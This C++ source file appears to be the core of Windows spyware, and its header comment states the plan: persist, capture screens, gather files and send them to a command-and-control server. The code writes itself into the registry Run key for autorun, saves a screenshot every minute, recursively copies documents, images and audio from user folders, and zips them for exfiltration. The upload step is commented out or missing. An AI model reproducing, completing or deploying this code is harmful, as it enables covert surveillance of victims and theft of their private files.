// pch.cpp: source file corresponding to the pre-compiled header

#include "pch.h"
#pragma once


/*
1. Get the C2's address via arguments (default is ==).

2. Register itself by creating a registry key in the 'Run' section of the Windows registry.

3. Capture the screen, save it as a file, and send it to the server. Repeat this every 1 minute.

4. Collect files with specific extensions and zip them (before doing so, check the registry first).

5. Send the zip file to the server.

*/


/*
0x00 : CSIDL_DESKTOP
0x05 : CSIDL_PERSONAL
0x0D : CSIDL_MYMUSIC
0x0E : CSIDL_MYVIDEO
*/
const BYTE CSIDL_LIST[] = { 0x0D, 0x0E };
const char* EXTENSIONS[] =
{ ".jpg",".jpeg",".png",".gif",".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",
    ".pptx",".pdf",".txt",".mp3",".amr",".m4a",".ogg",".aac",".jpg",".jpeg",".png",".gif",
    ".bmp",".hwp",".doc",".docx",".xls",".xlsx",".xlsm",".ppt",".pptx",".pdf" };


std::string mb_to_utf8(const std::string& mbstr)
{
    int wlen = MultiByteToWideChar(CP_ACP, 0, mbstr.c_str(), -1, NULL, 0);
    if (wlen == 0) {
        return std::string();
    }
    wchar_t* wbuf = new wchar_t[wlen];
    MultiByteToWideChar(CP_ACP, 0, mbstr.c_str(), -1, wbuf, wlen);

    int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, NULL, 0, NULL, NULL);
    if (len == 0) {
        delete[] wbuf;
        return std::string();
    }
    char* buf = new char[len];
    WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, buf, len, NULL, NULL);

    std::string result(buf);
    delete[] wbuf;
    delete[] buf;
    return result;
}

bool is_ipv4(const std::string& str) {
    // Define the IPv4 regex pattern
    std::regex pattern(R"((\d{1,3}\.){3}\d{1,3})");

    // Match the input string against the regex pattern
    return std::regex_match(str, pattern);
}

bool get_proc_name(std::string& proc_name) {
    DWORD pid = GetCurrentProcessId();
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (process == NULL) {
        OutputDebugStringA("[ERROR] Failed to open process (get_proc_name)");
        return false;
    }

    char filename[MAX_PATH];
    if (GetModuleFileNameExA(process, NULL, filename, MAX_PATH) == 0) {
        OutputDebugStringA("[ERROR] Failed to get process filename (get_proc_name)");
        CloseHandle(process);
        return false;
    }

    proc_name = filename;

    CloseHandle(process);
    return true;
}


bool register_autorun(std::string proc_name) {
    HKEY key;
    const std::string key_path = AUTORUN_PATH;
    const std::string value = AUTORUN_VALUE;

    // Open the key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) {
        OutputDebugStringA("[ERROR] Unable to open registry key (register_autorun)\n");
        return false;
    }

    // Check if the value exists
    DWORD type = REG_SZ;
    DWORD size;
    if (RegQueryValueExA(key, value.c_str(), NULL, &type, NULL, &size) != ERROR_SUCCESS) {

        if (RegSetValueExA(key, value.c_str(), 0, REG_SZ, (BYTE*)proc_name.c_str(), (strlen(proc_name.c_str()) + 1)) != ERROR_SUCCESS) {
            RegCloseKey(key);
            return false;
        }

    }

    // Close the key
    RegCloseKey(key);
    return true;
}


std::string get_local_time() {

    SYSTEMTIME time;
    GetLocalTime(&time);

    char buffer[30];
    sprintf(buffer, "%04d-%02d-%02d.%02d_%02d_%02d.png",
        time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);

    std::string current_time(buffer);
    return current_time;
}

void capture_screen() {

    while (true) {
        // Retrieve the local time to use as part of a file name
        std::string screen_path = SAVE_PATH + get_local_time();
        const char* filename = screen_path.c_str();

        // Get the desktop window and device context
        HDC desktop_dc = GetWindowDC(NULL);
        // Get the width and height of the screen
        int screen_width = GetSystemMetrics(SM_CXSCREEN);
        int screen_height = GetSystemMetrics(SM_CYSCREEN);

        // Create a bitmap compatible with the device context
        HDC memory_dc = CreateCompatibleDC(desktop_dc);
        HBITMAP bitmap = CreateCompatibleBitmap(desktop_dc, screen_width, screen_height);
        SelectObject(memory_dc, bitmap);
        // Copy the screen to the memory DC
        BitBlt(memory_dc, 0, 0, screen_width, screen_height, desktop_dc, 0, 0, SRCCOPY);

        //get the bitmap from the hbitmap
        BITMAP bmp_screen;
        GetObject(bitmap, sizeof(BITMAP), &bmp_screen);

        BITMAPFILEHEADER   bmf_header;
        BITMAPINFOHEADER   bi;

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp_screen.bmWidth;
        bi.biHeight = bmp_screen.bmHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD bmp_size = 0;
        HANDLE dbi = NULL;
        char* lpbitmap = NULL;

        bmp_size = ((bmp_screen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp_screen.bmHeight;

        dbi = GlobalAlloc(GHND, bmp_size);
        lpbitmap = (char*)GlobalLock(dbi);

        // Gets the "bits" from the bitmap, and copies them into a buffer 
        // that's pointed to by lpbitmap.
        GetDIBits(desktop_dc, bitmap, 0,
            (UINT)bmp_screen.bmHeight,
            lpbitmap,
            (BITMAPINFO*)&bi, DIB_RGB_COLORS);

        // Save the bitmap as a PNG file
        FILE* output_file = fopen(filename, "wb");
        png_structp png_ptr = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
        png_infop info_ptr = png_create_info_struct(png_ptr);
        png_init_io(png_ptr, output_file);
        png_set_IHDR(png_ptr, info_ptr, screen_width, screen_height, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE, PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT);
        png_write_info(png_ptr, info_ptr);
        png_bytep* row_pointers = new png_bytep[screen_height];
        for (int y = 0; y < screen_height; ++y) {
            row_pointers[y] = new png_byte[screen_width * 4]; // each pixel has 4 bytes (RGBA)
            if (row_pointers[y] != NULL) {
                memcpy(row_pointers[y], (LPBYTE)lpbitmap + (screen_height - y - 1) * screen_width * 4, screen_width * 4);
            }
            else {
                OutputDebugStringA("[ERROR] Fail to create screenshot (capture_screen)\n");
            }
        }

        png_write_image(png_ptr, row_pointers);
        png_write_end(png_ptr, NULL);
        png_destroy_write_struct(&png_ptr, &info_ptr);

        // Clean up
        fclose(output_file);
        GlobalUnlock(dbi);
        GlobalFree(dbi);
        delete[] row_pointers;
        DeleteObject(bitmap);
        DeleteDC(memory_dc);
        DeleteDC(desktop_dc);

        std::this_thread::sleep_for(std::chrono::minutes(1));
    }
}

void save_file(const fs::path& file_path, const fs::path& save_dir) {

    // Construct the path to the new file in the save directory
    fs::path savePath = save_dir / file_path.filename();

    // Copy the file to the save directory
    try
    {
        fs::copy_file(file_path, savePath);
    }
    catch (const fs::filesystem_error& e)
    {
    }
}

void enumerate_reculsively(const fs::path& dir_path, const fs::path& save_dir) {

    for (const auto& entry : fs::directory_iterator(dir_path))
    {
        if (fs::is_directory(entry.path()))
        {
            // Recursively enumerate files in subdirectories
            enumerate_reculsively(entry.path(), save_dir);
        }
        else if (fs::is_regular_file(entry.path()))
        {
            // Save the file if it has the desired extension
            DWORD cnt = sizeof(EXTENSIONS) / sizeof(*EXTENSIONS);
            while (cnt--) {
                if (entry.path().extension() == EXTENSIONS[cnt]) {
                    save_file(entry.path(), save_dir);
                    break;
                }
            }
        }
    }
}

bool collect_files() {

    // Create dir to collect files
    CreateDirectoryA(COLLECT_PATH, NULL);

    fs::path save_dir = COLLECT_PATH;

    DWORD idx = sizeof(CSIDL_LIST);

    while (idx--) {

        LPITEMIDLIST item_list = nullptr;
        char path[MAX_PATH] = { 0, };
        SHGetSpecialFolderLocation(NULL, CSIDL_LIST[idx], &item_list);
        SHGetPathFromIDListA(item_list, path);
        CoTaskMemFree(item_list);

        fs::path search_dir = path;

        enumerate_reculsively(search_dir, save_dir);

    }
    return true;

}


bool zip_dir() {
    const char* folder_path = COLLECT_PATH;
    const char* zip_path = ZIP_PATH;

    libzippp::ZipArchive zf(mb_to_utf8(zip_path).c_str());
    if (!zf.open(libzippp::ZipArchive::Write)) {
        OutputDebugStringA("[ERROR] Failed to open zip file (zip_dir)\n");
        return false;
    }

    fs::path search_dir = folder_path;

    std::vector<std::string> file_list;

    try {
        for (const auto& entry : fs::directory_iterator(search_dir)) {
            if (fs::is_regular_file(entry.path())) {
                file_list.push_back(entry.path().string());
            }
        }
    }
    catch (std::exception& e)
    {
        OutputDebugStringA("[ERROR] Failed to check collected file (zip_dir)\n");
    }


    for (auto& file : file_list) {

        int find = file.rfind("\\") + 1;
        std::string file_name = file.substr(find, file.length() - find);

        if (!zf.addFile(mb_to_utf8(file_name).c_str(), mb_to_utf8(file).c_str()))
        {
            OutputDebugStringA("[ERROR] Failed to add file to archive (zip_dir)\n");
            return false;
        }
    }

    if (!zf.close())
    {
        OutputDebugStringA("[ERROR] Failed to close archive (zip_dir)\n");
    }

    return true;

}

bool check_test_mode() {
    HKEY key;
    const std::string key_path = TEST_MODE;
    const std::string value = TEST_VALUE;

    // Open the key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path.c_str(), 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) {
        OutputDebugStringA("[Error] Unable to open registry key ");
        return false;
    }

    // Check if the value exists
    DWORD type = REG_DWORD;
    DWORD size;
    if (RegQueryValueExA(key, value.c_str(), NULL, &type, NULL, &size) != ERROR_SUCCESS) return false;

    return true;
}

int entry_point() {

    if (true == check_test_mode()) {
        MessageBoxA(NULL, "test", "test", NULL);
        return 0;
    }

    //std::string c2_addr = "";


    //if (false == is_ipv4(c2_addr)) {
    //    fprintf(stderr, "[error] invalid c2 address (%s)\n", c2_addr.c_str());
    //    return 1;
    //}

    std::string proc_name;
    if (false == get_proc_name(proc_name)) {
        OutputDebugStringA("[Error] Failed to get process name .");
        return 1;
    }

    if (false == register_autorun(proc_name)) {
        OutputDebugStringA("[Error] Unable to set registry value \n");
        return 1;
    }
   

    if (false == collect_files()) {
        OutputDebugStringA("[Error] Unable to collect file \n");
        return 1;
    }
    
    if (false == zip_dir()) {
        OutputDebugStringA("[Error] Failed to compress file \n");
        return 1;
    }

    std::thread t(capture_screen);
    t.join();
    return 0;
}
